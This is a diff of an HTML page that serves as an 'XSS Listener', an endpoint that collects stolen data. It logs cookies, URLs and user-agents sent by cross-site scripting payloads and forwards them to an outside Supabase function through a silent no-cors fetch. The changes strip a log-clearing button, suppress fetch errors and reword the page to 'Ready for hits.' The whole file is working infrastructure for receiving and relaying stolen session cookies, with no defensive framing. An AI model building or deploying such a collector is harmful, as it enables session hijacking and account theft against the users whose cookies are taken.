@@ -7,26 +7,19 @@
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
         pre { background: #111; padding: 15px; border: 1px solid #0f0; white-space: pre-wrap; }
         h1 { color: #0f0; }
-        button { margin-top: 10px; }
     </style>
 </head>
 <body>
     <h1>🔴 XSS Listener Active</h1>
     <p><strong>Listener URL:</strong> https://aryangeek.github.io/xss-listener/listener.html</p>
-    <button onclick="clearLogs()">Clear Logs</button>
     <hr>
     <pre id="logs">Waiting for hits...\n\n</pre>
 
     <script>
         const logsDiv = document.getElementById('logs');
         
-        // === YOUR REAL SUPABASE URL (already correct) ===
+        // === YOUR SUPABASE URL ===
         const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';
-
-        function clearLogs() {
-            localStorage.removeItem('xssLogs');
-            logsDiv.innerHTML = 'Logs cleared.\n\n';
-        }
 
         function loadLogs() {
             const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
@@ -43,19 +36,17 @@
 
                 const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;
 
-                // Show locally
+                // Show locally for testing
                 logsDiv.innerHTML += newLog;
                 localStorage.setItem('xssLogs', logsDiv.innerHTML);
 
-                // Send to Supabase
+                // Send to Supabase (no-cors, no auth needed now)
                 const sendParams = new URLSearchParams({ c: cookie, u: url, ua: userAgent });
 
                 fetch(BACKEND_URL + '?' + sendParams.toString(), {
                     method: 'GET',
                     mode: 'no-cors'
-                }).catch(err => {
-                    console.error('Fetch error (normal for no-cors):', err);
-                });
+                }).catch(() => {});   // silent fail is ok
 
                 console.log(newLog);
             } catch (e) {
@@ -69,7 +60,7 @@
         if (window.location.search) {
             addLog();
         } else {
-            logsDiv.innerHTML += 'Listener loaded. Add ?c=...&u=... to test.\n';
+            logsDiv.innerHTML += 'Listener loaded. Ready for hits.\n';
         }
     </script>
 </body>
